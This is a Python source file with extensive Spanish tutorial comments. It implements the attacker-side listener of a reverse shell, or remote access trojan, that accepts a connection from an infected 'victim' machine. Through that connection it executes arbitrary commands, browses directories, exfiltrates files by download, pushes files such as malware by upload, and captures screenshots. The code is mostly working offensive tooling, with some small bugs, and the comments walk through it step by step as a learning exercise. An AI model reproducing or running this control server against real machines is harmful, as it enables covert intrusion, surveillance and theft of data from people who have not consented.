#!/usr/bin/env python
#_*_coding: utf8 _*_

import socket #Importa el módulo socket, que proporciona una interfaz para las conexiones de red.
import base64 #proporciona funciones para codificar y decodificar,convertir datos binarios (como imágenes, archivos adjuntos, etc.) en 

def shell(): #Defina una función llamada shell()que se encarga de interactuar con el cliente.
    current_dir = target.recv(1024) #Recibe los datos enviados por el cliente. target es el socket que representa al cliente conectado e recv(1024)indica que se recibirán como máximo 1024 bytes de datos.
    count = 0 # definimos un contador para que cada pantallazo sea independiente al anterior y no se reescriba
    while True: #Comienza un bucle infinito para mantener la comunicación con el cliente activa hasta que se decida salir.
        comando = input("{}~#: ".format(current_dir)) #Solicita al usuario un comando a ejecutar en la consola del servidor. input()recibe la entrada del usuario desde la consola. comando es la variable que almacena los datos que vienen del cliente a diferencia de en cliente.py que la llamamos respuesta a la variable que almacena los datos que mandamos hacia aya
        if comando == b"exit": #Verifique si el comando ingresado es "exit", lo cual indica que el cliente desea salir.
            target.send(comando.encode()) #Envía el comando ingresado por el usuario al cliente.
            break
        elif comando [:2]== "cd":  #se va indicar que apartir de la segunda posicion del comando suministrado en la terminal si llega a ser cd lo devolvera del directorio actual a uno superior, estamos buscando el movernos por carpetas como buen revershell
            target.send(comando.encode()) #se manda dicho comando para en la siguiente linea recibir respuesta
            respuesta = target.recv(1024) # se recive dicha respuesta con hasta 1024 bytes de datos
            current_dir = respuesta # aqui modificamos los datos del current_dir (actual directorio) que habiamos usado con la respuesta del cliente el cual es el que metio el cd, estamos buscando movernos x directorios y al mismo tiempo que se vea en cual dir vamos al usar la consola 
        elif comando == "":   # aqui decimos que si el comando tipiado es igual a nada, pasa de largo y devuelve a la consola
            pass
        elif comando[:8] == "download": #le ponemos 8 ya q al ser un string usamos la tecnica slicing,determinando que comando ha introducido en el rango de posiciones, si la palabra es download sucede lo siguiente:
            target.send(comando.encode()) #envia download y para transferir de la victima infectada a este servidor tenemos que crear ese archivo  en la maquina local y luego escribir en el(entiendase escribir como meterle algo) de la siguiente manera:
            with open(comando[9:],'wb') as file_download: #with open abre y cierra automaticamente para no dejar abierto, y aqui le pedimos con :9 que abra lo especificado despues del 9no caracter y wb (write binary,escritura binaria) significa el modo q trabajaremos el archivo
                datos = target.recv(30000) #aqui decimos que le vamos a escribir al archivo, lo cual va ha ser lo recivido y toca especificarle la longitud del buffer, si el archivo a descargar es grande mas vale ponerle muchos bytes, todo esto en la variable datos
                file_download.write(base64.b64decode(datos)) #recuerda que la info no llega en texto plano sino codiados en base64 y b64decode convierte caracteres encodeados a texto plano y poder sobreescribir nuestro archivo llamado datos...procedemos hacer lo mismo en cliente.py
        elif comando [:6] == "upload": # le decimos que si comando en sus primeras 6 letrras es upload haga lo siguiente(subir un archivo)
            try: #Dentro del bloque try, encontraremos el código que debe ejecutarse para completar nuestro programa, mientras que en el bloque except encontramos las instrucciones que se ejecutan cuando algo dentro del bloque try falla.
                target.send(comando.encode()) #aqui mandamos los datos de lo que vamos abrir, vamos a mandar el comando que le va indicar al cliente o victima que estamos solicitando una sibida de archivos con target (recordemos que target es el socket) y send para enviar a comando o peticion(upload se envia para decir ey vamos hacer un upload alistate) esto antes de enviar el malware o lo que sea que vayamos a enviar
                with open(comando[7:], 'rb') as file_upload: #utilizando el manejador de contexto (with). y luego con open(respuesta[7:], 'rb') abre el archivo cuyo nombre está contenido en la variable respuesta, a partir del séptimo carácter en adelante. El archivo se asigna con as a la variable file_upload, El bloque with garantiza que el archivo se cerrará automáticamente al salir del bloque, incluso si ocurren excepciones.
                    target.sendall(base64.b64encode(file_upload.read())) #ahora si mandamos el paquete: file_upload.read() lee todo el contenido del archivo. base64.b64encode(...) codifica el contenido leído en base64. target.send(...) envía los datos codificados a algún destino (probablemente una conexión de red o similar en este caso).
            except Exception as e:  # Imprime cualquier error que ocurra durante la subida del archivo.
                print("Error uploading:",e)
        elif comando [:10] == "screenshot":
             # aqui habia puesto el contador que lo movi a antes de este bucle while donde todo comenzo para poder que no se sobreescriba la captura de pantalla
            target.send(comando.encode()) #envía el comando al cliente, recuerda que target es el socket que representa al cliente y lo enviamos encodeado porque lo que pasa de un lado a otro son bytes no la orden literal del string letra a letra (hay que pasarla a bytes para que llegue al otro lado el string)
            with open("monitor-%d.png" % count, 'wb') as screen: #creamos una imagen con la sentencia with y abrimos open dentro le establecemos el nombre que llevara cada imagen pantallazo y el porcentaje %d es para concatenar numero enteros(concatenaremos el contador) .png convierte el archivo automaticamente a formato png y a la derecha le especificamos dicha variable a concatenar nuevamente con su simbolo %, wb indica que vamos a escribir(crear) en escritura binaria(write binary) y as guardara el contenido o convierte todo en el objeto de archivo screen
                datos = target.recv(1000000) # despues de que suceda lo de las anteriores lineas, datos va ha ser lo que recibamos por parte del cliente (el contenido completo de la imagen) target como el socket cliente recive una longitud de 1000000 bytes de tamaño de datos, hay que especificar el tamaño para que no se genere un bufer overflow, recordemos que estos datos van a venir encodeados en base64
                data_decode = base64.b64decode(datos) # en esta linea vamos a decodear el contenido que nos llega del cliente y recivimos arriba por eso le pasamos datos entre los parentesis de la herramienta decodificadora
                if data_decode == "fail": #aqui realizamos una comparacion a modo de verificar si hubo una excepcion, este mensaje de fail sera establecido por lado del cliente
                    print("no se pudo tomar la captura de pantalla") # esto se imprime en el caso de que fail suceda
                else: # si se pudo tomar la captura de pantalla sucedera lo siguiente (escribir los datos decodeados, es decir guardar la imagen que llega en data_decode)
                    screen.write(data_decode)
                    print("captura tomada con exito")
                    count = count + 1 # aqui le sumamos 1 al contador para que cada vez que se suba una nueva pantallazo se incremente el contador, esto es lo mismo que haber escrito: count = count + 1
        else:
            target.sendall(comando.encode()) #envía la respuesta codificada en bytes
            respuesta = target.recv(33024).decode() #Recibe la respuesta del cliente después de ejecutar el comando:
            if respuesta == "1":  #al ser 1 y como lo mencionamos al hacerlo en el cliente 1 indica que no se oprimieron teclas mas que enter
                continue #con la sentenncia continue le indicamos que eso fue todo u reinicia la funcion shell
            else:
                print(respuesta) #Envía la salida del comando de vuelta al servidor independientemente de buena o error y vamos al servidor para implementar algo similar

def upserver(): #Defina una función de llamada upserver()que se encarga de iniciar el servidor y aceptar conexiones entrantes.
    # 3 lineas siguientes declaran las variables server, ipy targetcomo globales para poder accederlas desde cualquier parte del código.
    global server
    global ip
    global target

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Crea un objeto socket para el servidor utilizando la dirección IPv4 y TCP.
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Configure la opción del socket para permitir que la dirección IP y el puerto se reutilicen inmediatamente después de cerrar el socket.
    server.bind(('192.168.1.130', 7777)) #Conecte el enchufe a la dirección IP y al puerto especificado.
    server.listen(1) #Comienza a escuchar las conexiones entrantes. El argumento 1indica que se permitirá solo una conexión pendiente en la cola.

    print("corriendo servidor y esperando conexiones...")

    target,ip = server.accept() #Acepta la conexión entrante del cliente y obtiene el socket del cliente ( target) y la dirección IP del cliente ( ip).
    print("conexion recibida de:" + str(ip[0])) #Imprime un mensaje indicando que se ha recibido una conexión del cliente.

upserver() #Llama a la función upserver()para iniciar el servidor.
shell() #Llama a la función shell()para interactuar con el cliente.
server.close #Cierra el socket del servidor después de terminar la comunicación con el cliente.